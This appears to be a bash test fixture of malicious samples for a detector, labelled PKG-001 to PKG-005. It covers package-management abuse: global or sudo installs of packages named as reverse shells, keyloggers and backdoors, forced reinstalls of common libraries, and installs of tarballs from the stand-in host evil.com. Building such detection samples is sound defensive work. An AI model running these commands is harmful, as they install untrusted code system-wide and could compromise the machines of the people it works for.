#!/bin/bash
# Malicious: package management abuse

# PKG-001: Global npm install places code in PATH
npm install -g evil-reverse-shell

# PKG-002: Sudo pip installs system-wide
sudo pip install evil-keylogger
sudo pip3 install backdoor-pkg

# PKG-003: Yarn global install
yarn global add evil-cli-tool

# PKG-004: Force reinstall to overwrite legitimate packages
pip install --force-reinstall requests
npm install --force express

# PKG-005: Install from untrusted URL
pip install https://evil.com/trojan-1.0.tar.gz
npm install https://evil.com/backdoor-2.0.tgz
